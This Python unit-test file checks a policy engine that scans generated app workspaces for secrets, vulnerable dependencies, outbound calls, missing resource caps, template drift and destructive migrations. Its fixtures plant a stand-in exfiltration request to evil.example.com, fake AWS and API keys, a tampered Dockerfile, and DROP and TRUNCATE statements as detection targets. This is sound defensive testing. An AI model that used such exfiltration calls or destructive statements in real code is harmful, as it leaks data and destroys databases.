"""Unit tests for the policy check engine.
Pure-function checks over a real temp
workspace directory — no Docker, no network, no DB."""

from __future__ import annotations

import os

import pytest

from app.config import settings
from app.services.policy_checks import (
    PolicyCheckName,
    PolicyCheckStatus,
    PolicyRiskTier,
    build_policy_verdict,
    check_dependency_vulnerabilities,
    check_destructive_ddl,
    check_egress_detection,
    check_resource_limits,
    check_secrets_pii,
    check_template_compliance,
    compute_risk_tier,
    run_policy_checks,
)


def _write(path: str, content: str) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)


# ---------------------------------------------------------------------------
# Fixtures: a minimal template skeleton + protected paths, mirroring
# backend/templates/generic-webtool/.
# ---------------------------------------------------------------------------


@pytest.fixture()
def template_dir(tmp_path):
    d = tmp_path / "template"
    _write(str(d / "Dockerfile"), "FROM python:3.11-slim\nWORKDIR /app\nCOPY app/ /app/\nCMD [\"python\", \"app.py\"]\n")
    _write(
        str(d / "compose.yaml"),
        "services:\n  app:\n    build: .\n    ports:\n      - \"8000:8000\"\n    deploy:\n      resources:\n        limits:\n          cpus: '1.0'\n          memory: 512M\n",
    )
    return str(d)


@pytest.fixture()
def workspace_dir(tmp_path):
    d = tmp_path / "workspace"
    d.mkdir()
    return str(d)


def _copy_protected_paths(workspace_dir: str, template_dir: str, protected_paths: list[str]) -> None:
    import shutil

    for rel in protected_paths:
        src = os.path.join(template_dir, rel)
        dst = os.path.join(workspace_dir, rel)
        os.makedirs(os.path.dirname(dst) or ".", exist_ok=True)
        shutil.copyfile(src, dst)


PROTECTED_PATHS = ["Dockerfile", "compose.yaml"]


# ---------------------------------------------------------------------------
# Check 1: secrets / PII
# ---------------------------------------------------------------------------


def test_secrets_check_passes_on_clean_source(workspace_dir):
    _write(os.path.join(workspace_dir, "app", "app.py"), "print('hello world')\n")
    result = check_secrets_pii(workspace_dir)
    assert result.result == PolicyCheckStatus.PASS
    assert result.findings == []


def test_secrets_check_flags_planted_secret(workspace_dir):
    _write(
        os.path.join(workspace_dir, "app", "config.py"),
        "AWS_ACCESS_KEY_ID = 'AKIAABCDEFGHIJKLMNOP'\n",
    )
    result = check_secrets_pii(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert len(result.findings) >= 1
    assert result.findings[0]["type"] == "hardcoded_secret"
    # Never store the full secret value.
    assert "AKIAABCDEFGHIJKLMNOP" not in str(result.findings)
    assert "REDACTED" in result.findings[0]["match"]


def test_secrets_check_flags_generic_api_key_assignment(workspace_dir):
    _write(
        os.path.join(workspace_dir, "app", "app.py"),
        "api_key = 'sk-verysecretvalue123456'\n",
    )
    result = check_secrets_pii(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG


# ---------------------------------------------------------------------------
# Check 2: dependency vulnerabilities
# ---------------------------------------------------------------------------


def test_dependency_check_passes_with_no_manifest(workspace_dir):
    result = check_dependency_vulnerabilities(workspace_dir, network_available=True)
    assert result.result == PolicyCheckStatus.PASS


def test_dependency_check_flags_known_vulnerable_pin_even_with_network(workspace_dir):
    _write(os.path.join(workspace_dir, "requirements.txt"), "requests==2.19.1\nflask==2.3.0\n")
    result = check_dependency_vulnerabilities(workspace_dir, network_available=True)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "known_vulnerable_pin" and f["package"] == "requests" for f in result.findings)


def test_dependency_check_fails_closed_offline_even_with_clean_manifest(workspace_dir):
    """spec: a vuln check needing network data must degrade gracefully
    offline; offline == cannot verify == flag (fail-closed)."""
    _write(os.path.join(workspace_dir, "requirements.txt"), "requests==2.31.0\n")
    result = check_dependency_vulnerabilities(workspace_dir, network_available=False)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "offline_degraded" for f in result.findings)


# ---------------------------------------------------------------------------
# Check 3: egress detection
# ---------------------------------------------------------------------------


def test_egress_check_passes_on_no_network_calls(workspace_dir):
    _write(os.path.join(workspace_dir, "app", "app.py"), "print('no network here')\n")
    result = check_egress_detection(workspace_dir)
    assert result.result == PolicyCheckStatus.PASS


def test_egress_check_flags_non_allowlisted_call(workspace_dir):
    _write(
        os.path.join(workspace_dir, "app", "app.py"),
        "import requests\nrequests.get('https://evil.example.com/exfiltrate')\n",
    )
    result = check_egress_detection(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["host"] == "evil.example.com" for f in result.findings)


def test_egress_check_allows_pypi_registry(workspace_dir):
    _write(
        os.path.join(workspace_dir, "app", "app.py"),
        "import requests\nrequests.get('https://pypi.org/simple/somepkg')\n",
    )
    result = check_egress_detection(workspace_dir)
    assert result.result == PolicyCheckStatus.PASS


# the service's screen (.html/.htm/.css) is inside the gate's view.

_CLEAN_PAGE = (
    "<!DOCTYPE html>\n<html><head><title>t</title>"
    '<link rel="stylesheet" href="static/site.css"></head>'
    '<body><a href="items">items</a><form action="items" method="post"></form>'
    '<script>fetch("items").then(function (r) { return r.json(); });</script>'
    "</body></html>\n"
)


def test_egress_check_flags_a_cdn_script_in_an_html_page(workspace_dir):
    _write(
        os.path.join(workspace_dir, "app", "static", "index.html"),
        '<html><body><script src="https://cdn.example.com/x.js"></script></body></html>\n',
    )
    result = check_egress_detection(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert [(f["path"], f["host"]) for f in result.findings] == [
        ("app/static/index.html", "cdn.example.com")
    ]


def test_egress_check_flags_a_stylesheet_import_from_another_host(workspace_dir):
    _write(
        os.path.join(workspace_dir, "app", "static", "site.css"),
        "@import url(https://fonts.example.com/f.css);\nbody { margin: 0; }\n",
    )
    result = check_egress_detection(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert [(f["path"], f["host"]) for f in result.findings] == [("app/static/site.css", "fonts.example.com")]


def test_egress_check_flags_an_htm_file_and_an_upper_case_extension(workspace_dir):
    _write(os.path.join(workspace_dir, "a.htm"), '<img src="http://img.example.com/a.png">\n')
    _write(os.path.join(workspace_dir, "B.HTML"), '<img src="http://img2.example.com/a.png">\n')
    result = check_egress_detection(workspace_dir)
    assert sorted(f["host"] for f in result.findings) == ["img.example.com", "img2.example.com"]


@pytest.mark.parametrize(
    ("name", "content"),
    [
        ("p.html", '<script src="//cdn.example.com/x.js"></script>\n'),
        ("p.html", "<link rel=stylesheet href='//cdn.example.com/x.css'>\n"),
        ("p.html", '<form action = "//cdn.example.com/collect"></form>\n'),
        ("p.css", "body { background: url(//cdn.example.com/bg.png); }\n"),
        ("p.css", '@import "//cdn.example.com/f.css";\n'),
    ],
)
def test_egress_check_flags_a_protocol_relative_reference_in_a_screen_file(workspace_dir, name, content):
    _write(os.path.join(workspace_dir, name), content)
    result = check_egress_detection(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert [f["host"] for f in result.findings] == ["cdn.example.com"]


def test_egress_check_passes_a_page_with_only_relative_urls(workspace_dir):
    _write(os.path.join(workspace_dir, "app", "static", "index.html"), _CLEAN_PAGE)
    _write(
        os.path.join(workspace_dir, "app", "static", "site.css"),
        "body { background: url(bg.png); }\n@import url('more.css');\n",
    )
    result = check_egress_detection(workspace_dir)
    assert result.result == PolicyCheckStatus.PASS
    assert result.findings == []


def test_egress_check_does_not_read_a_double_slash_comment_in_a_script_as_a_url(workspace_dir):
    _write(
        os.path.join(workspace_dir, "p.html"),
        "<script>\n// load the list, then render it\nvar src = 1; // done\nvar url = 'items'; // relative\n</script>\n",
    )
    assert check_egress_detection(workspace_dir).result == PolicyCheckStatus.PASS


def test_egress_check_flags_an_xml_namespace_in_a_page_rather_than_allowlisting_it(workspace_dir):
    # Decision: no allowlist hole for `http://www.w3.org/...`. An inline <svg> in an
    # HTML5 page needs no xmlns, so the page is changed, not the gate.
    _write(
        os.path.join(workspace_dir, "p.html"),
        '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"></svg>\n',
    )
    result = check_egress_detection(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert [f["host"] for f in result.findings] == ["www.w3.org"]


def test_egress_check_still_ignores_a_url_in_documentation(workspace_dir):
    # The egress extension list is a subset of the secrets one: a README link is not a call.
    _write(os.path.join(workspace_dir, "README.md"), "See https://docs.example.com/guide\n")
    assert check_egress_detection(workspace_dir).result == PolicyCheckStatus.PASS


def test_secrets_check_flags_a_secret_in_an_html_page_and_a_stylesheet(workspace_dir):
    _write(
        os.path.join(workspace_dir, "app", "static", "index.html"),
        "<script>var cfg = { api_key: 'sk-verysecretvalue123456' };</script>\n",
    )
    _write(
        os.path.join(workspace_dir, "app", "static", "site.css"),
        "/* AKIAABCDEFGHIJKLMNOP */\nbody { margin: 0; }\n",
    )
    result = check_secrets_pii(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert sorted(f["path"] for f in result.findings) == ["app/static/index.html", "app/static/site.css"]
    assert "sk-verysecretvalue123456" not in str(result.findings)


def test_secrets_check_passes_a_clean_html_page(workspace_dir):
    _write(os.path.join(workspace_dir, "app", "static", "index.html"), _CLEAN_PAGE)
    assert check_secrets_pii(workspace_dir).result == PolicyCheckStatus.PASS


# ---------------------------------------------------------------------------
# Check 4: resource limits
# ---------------------------------------------------------------------------


def test_resource_limits_check_passes_with_caps_present(workspace_dir):
    _write(
        os.path.join(workspace_dir, "compose.yaml"),
        "services:\n  app:\n    build: .\n    deploy:\n      resources:\n        limits:\n          cpus: '1.0'\n          memory: 512M\n",
    )
    result = check_resource_limits(workspace_dir)
    assert result.result == PolicyCheckStatus.PASS


def test_resource_limits_check_flags_missing_compose_file(workspace_dir):
    result = check_resource_limits(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "missing_deploy_config" for f in result.findings)


def test_resource_limits_check_flags_missing_caps(workspace_dir):
    _write(os.path.join(workspace_dir, "compose.yaml"), "services:\n  app:\n    build: .\n")
    result = check_resource_limits(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "missing_resource_caps" for f in result.findings)


# ---------------------------------------------------------------------------
# Check 5: template compliance
# ---------------------------------------------------------------------------


def test_template_compliance_passes_when_protected_paths_match(workspace_dir, template_dir):
    _copy_protected_paths(workspace_dir, template_dir, PROTECTED_PATHS)
    result = check_template_compliance(
        workspace_dir, template_skeleton_dir=template_dir, protected_paths=PROTECTED_PATHS
    )
    assert result.result == PolicyCheckStatus.PASS


def test_template_compliance_flags_protected_path_deviation(workspace_dir, template_dir):
    _copy_protected_paths(workspace_dir, template_dir, PROTECTED_PATHS)
    # Simulate drift that somehow survived to this point (defense in depth —
    # publish.py's restore step should already have fixed this).
    _write(os.path.join(workspace_dir, "Dockerfile"), "FROM evil:latest\n")
    result = check_template_compliance(
        workspace_dir, template_skeleton_dir=template_dir, protected_paths=PROTECTED_PATHS
    )
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "protected_path_deviation" and f["path"] == "Dockerfile" for f in result.findings)


def test_template_compliance_flags_missing_protected_path(workspace_dir, template_dir):
    _write(os.path.join(workspace_dir, "compose.yaml"), (open(os.path.join(template_dir, "compose.yaml")).read()))
    # Dockerfile never restored at all.
    result = check_template_compliance(
        workspace_dir, template_skeleton_dir=template_dir, protected_paths=PROTECTED_PATHS
    )
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "protected_path_missing" and f["path"] == "Dockerfile" for f in result.findings)


# ---------------------------------------------------------------------------
# Check 6: destructive DDL (ADR 0023 §Schema migrations)
# ---------------------------------------------------------------------------


def _migration_source(upgrade_body: str, import_line: str = "from alembic import op") -> str:
    """A minimal but realistic Alembic revision script: carries the same
    `down_revision` boilerplate every real `alembic revision` invocation
    generates (the signature `check_destructive_ddl` looks for), so these
    fixtures exercise the same detection path a real migration would.
    `import_line` is overridable for the aliased-import case
    (`from alembic import op as o`)."""
    return (
        '"""test migration\n\n'
        "Revision ID: abc123\n"
        "Revises: \n"
        '"""\n'
        f"{import_line}\n"
        "import sqlalchemy as sa\n\n"
        "revision = 'abc123'\n"
        "down_revision = None\n\n"
        "def upgrade() -> None:\n"
        f"{upgrade_body}\n\n"
        "def downgrade() -> None:\n"
        "    pass\n"
    )


def _write_migration(
    workspace_dir: str,
    upgrade_body: str,
    name: str = "0002_test.py",
    import_line: str = "from alembic import op",
) -> None:
    _write(
        os.path.join(workspace_dir, "migrations", "versions", name),
        _migration_source(upgrade_body, import_line=import_line),
    )


def test_destructive_ddl_passes_on_additive_migration_only(workspace_dir):
    """Anchored against a check that always flags: additive-only DDL
    (add_column/create_table/create_index) must pass, or every other
    assertion in this section would pass for a function that returns
    `_flag(...)` unconditionally."""
    _write_migration(
        workspace_dir,
        "    op.add_column('widgets', sa.Column('name', sa.String(), nullable=True))\n"
        "    op.create_table('gadgets', sa.Column('id', sa.String(), nullable=False))\n"
        "    op.create_index('ix_widgets_name', 'widgets', ['name'])",
    )
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.PASS
    assert result.findings == []


def test_destructive_ddl_ignores_python_files_without_the_migration_signature(workspace_dir):
    """A plain `.py` file containing the word DROP (e.g. app source, not a
    migration) must not be scanned — only files carrying the Alembic
    `down_revision` signature are migration files."""
    _write(os.path.join(workspace_dir, "app", "app.py"), "op.drop_table('not_a_migration')\n")
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.PASS


def test_destructive_ddl_flags_drop_table(workspace_dir):
    _write_migration(workspace_dir, "    op.drop_table('widgets')")
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_drop_table" and f["path"].endswith("0002_test.py") for f in result.findings)


def test_destructive_ddl_flags_drop_column(workspace_dir):
    _write_migration(workspace_dir, "    op.drop_column('widgets', 'name')")
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_drop_column" for f in result.findings)


def test_destructive_ddl_flags_drop_constraint(workspace_dir):
    _write_migration(workspace_dir, "    op.drop_constraint('uq_widgets_name', 'widgets', type_='unique')")
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_drop_constraint" for f in result.findings)


def test_destructive_ddl_flags_drop_index(workspace_dir):
    _write_migration(workspace_dir, "    op.drop_index('ix_widgets_name', table_name='widgets')")
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_drop_index" for f in result.findings)


def test_destructive_ddl_flags_alter_column_type_change(workspace_dir):
    _write_migration(workspace_dir, "    op.alter_column('widgets', 'name', type_=sa.String(length=10))")
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_type_change" for f in result.findings)


def test_destructive_ddl_flags_alter_column_narrowing_nullable(workspace_dir):
    _write_migration(workspace_dir, "    op.alter_column('widgets', 'name', nullable=False)")
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_narrowing_nullable" for f in result.findings)


def test_destructive_ddl_alter_column_widening_nullable_true_is_not_flagged(workspace_dir):
    """The inverse of the narrowing case: relaxing a column to nullable is
    additive (the previous image can still write non-NULL), so this must
    not flag — anchors that the check reads the nullable value, not just
    the presence of the keyword."""
    _write_migration(workspace_dir, "    op.alter_column('widgets', 'name', nullable=True)")
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.PASS


def test_destructive_ddl_flags_raw_sql_drop(workspace_dir):
    _write_migration(workspace_dir, '    op.execute("DROP TABLE widgets")')
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_raw_sql" for f in result.findings)


def test_destructive_ddl_flags_raw_sql_truncate(workspace_dir):
    _write_migration(workspace_dir, '    op.execute("TRUNCATE widgets")')
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_raw_sql" for f in result.findings)


def test_destructive_ddl_flags_raw_sql_alter_type(workspace_dir):
    _write_migration(workspace_dir, '    op.execute("ALTER TABLE widgets ALTER COLUMN name TYPE varchar(10)")')
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_raw_sql" for f in result.findings)


def test_destructive_ddl_raw_sql_select_is_not_flagged(workspace_dir):
    """Anchors that op.execute() itself is not inherently destructive —
    only the keyword patterns above are."""
    _write_migration(workspace_dir, '    op.execute("SELECT 1")')
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.PASS


# --- two silent misses found after approval. Matching only
# literally `op.<name>(` missed `batch_alter_table` blocks (operations go
# through a `batch_op.*` alias) and an aliased `op` import — both
# plausible from an LLM-authored migration (batch mode is the idiom most
# Alembic tutorials show) even though Alembic's own autogenerate never
# emits either. Neither is a false positive costing an approver a read;
# both are a silent `pass` on exactly what this check exists to catch,
# auto-approved (ADR 0008) with nobody reading it — worse than a false
# positive, so each gets its own form-per-test coverage like the direct
# `op.*` forms above (h1: one test per form on the batch alias).


def test_destructive_ddl_flags_drop_column_inside_batch_alter_table(workspace_dir):
    _write_migration(
        workspace_dir,
        "    with op.batch_alter_table('widgets') as batch_op:\n"
        "        batch_op.drop_column('name')",
    )
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_drop_column" for f in result.findings)


def test_destructive_ddl_flags_drop_constraint_inside_batch_alter_table(workspace_dir):
    _write_migration(
        workspace_dir,
        "    with op.batch_alter_table('widgets') as batch_op:\n"
        "        batch_op.drop_constraint('uq_widgets_name', type_='unique')",
    )
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_drop_constraint" for f in result.findings)


def test_destructive_ddl_flags_drop_index_inside_batch_alter_table(workspace_dir):
    _write_migration(
        workspace_dir,
        "    with op.batch_alter_table('widgets') as batch_op:\n"
        "        batch_op.drop_index('ix_widgets_name')",
    )
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_drop_index" for f in result.findings)


def test_destructive_ddl_flags_alter_column_type_change_inside_batch_alter_table(workspace_dir):
    _write_migration(
        workspace_dir,
        "    with op.batch_alter_table('widgets') as batch_op:\n"
        "        batch_op.alter_column('name', type_=sa.String(length=4))",
    )
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_type_change" for f in result.findings)


def test_destructive_ddl_flags_drop_table_via_aliased_op_import(workspace_dir):
    """h2: an aliased import (`from alembic import op as o`) must not
    defeat detection. The fix is receiver-agnostic method-name matching
    (see `_DDL_CALL_PATTERN`), so this and the batch-alias tests above
    share one mechanism rather than each needing its own special case."""
    _write_migration(
        workspace_dir,
        "    o.drop_table('widgets')",
        import_line="from alembic import op as o",
    )
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_drop_table" for f in result.findings)


def test_destructive_ddl_receiver_agnostic_match_also_flags_a_same_named_helper_definition(workspace_dir):
    """h4, demonstrated rather than only asserted in prose: the same
    receiver-agnostic match that catches `batch_op.drop_index(...)` and
    `o.drop_table(...)` also flags a plain function *definition* named
    after one of the destructive methods inside a migration file (e.g. a
    local helper `def drop_index(name): ...`), since the pattern cannot
    distinguish a call from a def line. Accepted over-match: within a file
    already known to be a migration, this costs an approver a read rather
    than hiding a real destructive change."""
    _write_migration(
        workspace_dir,
        "    pass\n\n"
        "def drop_index(name):\n"
        "    return name",
    )
    result = check_destructive_ddl(workspace_dir)
    assert result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "destructive_drop_index" for f in result.findings)


# ---------------------------------------------------------------------------
# Fail-closed: a check that errors never yields "pass"
# ---------------------------------------------------------------------------


def test_run_policy_checks_fails_closed_on_check_error(workspace_dir, template_dir, monkeypatch):
    import app.services.policy_checks as policy_checks_module

    def _boom(*args, **kwargs):
        raise RuntimeError("simulated tool crash")

    monkeypatch.setattr(policy_checks_module, "check_secrets_pii", _boom)

    results = run_policy_checks(
        workspace_dir=workspace_dir,
        template_skeleton_dir=template_dir,
        protected_paths=PROTECTED_PATHS,
        network_available=True,
    )
    secrets_result = next(r for r in results if r.check_name == PolicyCheckName.SECRETS_PII)
    assert secrets_result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "check_error" for f in secrets_result.findings)


def test_run_policy_checks_fails_closed_on_destructive_ddl_check_error(workspace_dir, template_dir, monkeypatch):
    """Acceptance: 'a migration file that cannot be read or parsed
    produces flag, not pass — the existing `_run_safely` behaviour,
    confirmed by a test rather than assumed.' Mirrors the secrets/PII case
    above: the wrapper is generic, but this proves it is actually applied
    to the sixth check too, not only assumed by symmetry."""
    import app.services.policy_checks as policy_checks_module

    def _boom(*args, **kwargs):
        raise OSError("simulated unreadable/unparsable migration file")

    monkeypatch.setattr(policy_checks_module, "check_destructive_ddl", _boom)

    results = run_policy_checks(
        workspace_dir=workspace_dir,
        template_skeleton_dir=template_dir,
        protected_paths=PROTECTED_PATHS,
        network_available=True,
    )
    ddl_result = next(r for r in results if r.check_name == PolicyCheckName.DESTRUCTIVE_DDL)
    assert ddl_result.result == PolicyCheckStatus.FLAG
    assert any(f["type"] == "check_error" for f in ddl_result.findings)


def test_run_policy_checks_returns_all_six_checks(workspace_dir, template_dir):
    _copy_protected_paths(workspace_dir, template_dir, PROTECTED_PATHS)
    results = run_policy_checks(
        workspace_dir=workspace_dir,
        template_skeleton_dir=template_dir,
        protected_paths=PROTECTED_PATHS,
        network_available=True,
    )
    assert {r.check_name for r in results} == set(PolicyCheckName.ALL)


def test_run_policy_checks_destructive_ddl_passes_with_no_migrations_at_all(workspace_dir, template_dir):
    """Anchored against a check that never runs (PLAN's defined-tested-
    uncalled rule): reached through `run_policy_checks`, not only called
    directly, on a workspace with no migration files at all -> `pass`. A
    defined-but-unwired check would either be absent from this list
    entirely or never independently exercised."""
    _copy_protected_paths(workspace_dir, template_dir, PROTECTED_PATHS)
    results = run_policy_checks(
        workspace_dir=workspace_dir,
        template_skeleton_dir=template_dir,
        protected_paths=PROTECTED_PATHS,
        network_available=True,
    )
    ddl_result = next(r for r in results if r.check_name == PolicyCheckName.DESTRUCTIVE_DDL)
    assert ddl_result.result == PolicyCheckStatus.PASS


# ---------------------------------------------------------------------------
# Risk tier computation
# ---------------------------------------------------------------------------


MEDIUM_CHECKS = ["dependency_vulnerabilities", "resource_limits", "template_compliance"]
HIGH_CHECKS = ["secrets_pii", "egress_detection"]


def _result(check_name: str, status: str):
    from app.services.policy_checks import CheckResult

    return CheckResult(check_name=check_name, result=status, summary="test", findings=[])


def test_tier_is_low_when_all_pass():
    checks = [_result(name, PolicyCheckStatus.PASS) for name in PolicyCheckName.ALL]
    tier = compute_risk_tier(checks, medium_tier_checks=MEDIUM_CHECKS, high_tier_checks=HIGH_CHECKS)
    assert tier == PolicyRiskTier.LOW


def test_tier_is_medium_on_dependency_flag():
    checks = [_result(name, PolicyCheckStatus.PASS) for name in PolicyCheckName.ALL]
    checks = [
        _result(PolicyCheckName.DEPENDENCY_VULNERABILITIES, PolicyCheckStatus.FLAG)
        if c.check_name == PolicyCheckName.DEPENDENCY_VULNERABILITIES
        else c
        for c in checks
    ]
    tier = compute_risk_tier(checks, medium_tier_checks=MEDIUM_CHECKS, high_tier_checks=HIGH_CHECKS)
    assert tier == PolicyRiskTier.MEDIUM


def test_tier_is_high_on_secrets_flag():
    checks = [_result(name, PolicyCheckStatus.PASS) for name in PolicyCheckName.ALL]
    checks = [
        _result(PolicyCheckName.SECRETS_PII, PolicyCheckStatus.FLAG)
        if c.check_name == PolicyCheckName.SECRETS_PII
        else c
        for c in checks
    ]
    tier = compute_risk_tier(checks, medium_tier_checks=MEDIUM_CHECKS, high_tier_checks=HIGH_CHECKS)
    assert tier == PolicyRiskTier.HIGH


def test_high_tier_wins_over_medium_when_both_flag():
    checks = [
        _result(PolicyCheckName.SECRETS_PII, PolicyCheckStatus.FLAG),
        _result(PolicyCheckName.DEPENDENCY_VULNERABILITIES, PolicyCheckStatus.FLAG),
        _result(PolicyCheckName.EGRESS_DETECTION, PolicyCheckStatus.PASS),
        _result(PolicyCheckName.RESOURCE_LIMITS, PolicyCheckStatus.PASS),
        _result(PolicyCheckName.TEMPLATE_COMPLIANCE, PolicyCheckStatus.PASS),
    ]
    tier = compute_risk_tier(checks, medium_tier_checks=MEDIUM_CHECKS, high_tier_checks=HIGH_CHECKS)
    assert tier == PolicyRiskTier.HIGH


def test_unrecognized_flagged_check_fails_closed_to_high():
    checks = [_result("some_future_check", PolicyCheckStatus.FLAG)]
    tier = compute_risk_tier(checks, medium_tier_checks=MEDIUM_CHECKS, high_tier_checks=HIGH_CHECKS)
    assert tier == PolicyRiskTier.HIGH


# --- a flagged destructive_ddl must resolve to `medium` through
# the REAL config defaults (not a hand-passed list, which would pass even if
# config.py's default forgot to add it), and the fail-closed direction must
# still hold when it is absent from both configured tier lists.


def test_destructive_ddl_flag_computes_medium_tier_with_real_config_defaults():
    checks = [_result(name, PolicyCheckStatus.PASS) for name in PolicyCheckName.ALL]
    checks = [
        _result(PolicyCheckName.DESTRUCTIVE_DDL, PolicyCheckStatus.FLAG)
        if c.check_name == PolicyCheckName.DESTRUCTIVE_DDL
        else c
        for c in checks
    ]
    tier = compute_risk_tier(
        checks,
        medium_tier_checks=settings.policy_medium_tier_checks_list,
        high_tier_checks=settings.policy_high_tier_checks_list,
    )
    assert tier == PolicyRiskTier.MEDIUM


def test_destructive_ddl_flag_fails_closed_to_high_when_absent_from_configured_tiers():
    """MEDIUM_CHECKS/HIGH_CHECKS above deliberately do not list
    destructive_ddl — representing an operator who overrode
    POLICY_MEDIUM_TIER_CHECKS before this check existed and has not added
    it. Fail-closed: high, not silently dropped."""
    checks = [_result(name, PolicyCheckStatus.PASS) for name in PolicyCheckName.ALL]
    checks = [
        _result(PolicyCheckName.DESTRUCTIVE_DDL, PolicyCheckStatus.FLAG)
        if c.check_name == PolicyCheckName.DESTRUCTIVE_DDL
        else c
        for c in checks
    ]
    tier = compute_risk_tier(checks, medium_tier_checks=MEDIUM_CHECKS, high_tier_checks=HIGH_CHECKS)
    assert tier == PolicyRiskTier.HIGH


# ---------------------------------------------------------------------------
# End-to-end pure-function verdict
# ---------------------------------------------------------------------------


def test_build_policy_verdict_low_tier_on_clean_workspace(workspace_dir, template_dir):
    _copy_protected_paths(workspace_dir, template_dir, PROTECTED_PATHS)
    _write(os.path.join(workspace_dir, "app", "app.py"), "print('clean app')\n")

    verdict = build_policy_verdict(
        workspace_dir=workspace_dir,
        template_skeleton_dir=template_dir,
        protected_paths=PROTECTED_PATHS,
        medium_tier_checks=MEDIUM_CHECKS,
        high_tier_checks=HIGH_CHECKS,
        network_available=True,
    )
    assert verdict.risk_tier == PolicyRiskTier.LOW
    assert len(verdict.checks) == 6
    assert all(c.result == PolicyCheckStatus.PASS for c in verdict.checks)


def test_build_policy_verdict_high_tier_on_planted_secret(workspace_dir, template_dir):
    _copy_protected_paths(workspace_dir, template_dir, PROTECTED_PATHS)
    _write(
        os.path.join(workspace_dir, "app", "app.py"),
        "AWS_ACCESS_KEY_ID = 'AKIAABCDEFGHIJKLMNOP'\n",
    )

    verdict = build_policy_verdict(
        workspace_dir=workspace_dir,
        template_skeleton_dir=template_dir,
        protected_paths=PROTECTED_PATHS,
        medium_tier_checks=MEDIUM_CHECKS,
        high_tier_checks=HIGH_CHECKS,
        network_available=True,
    )
    assert verdict.risk_tier == PolicyRiskTier.HIGH
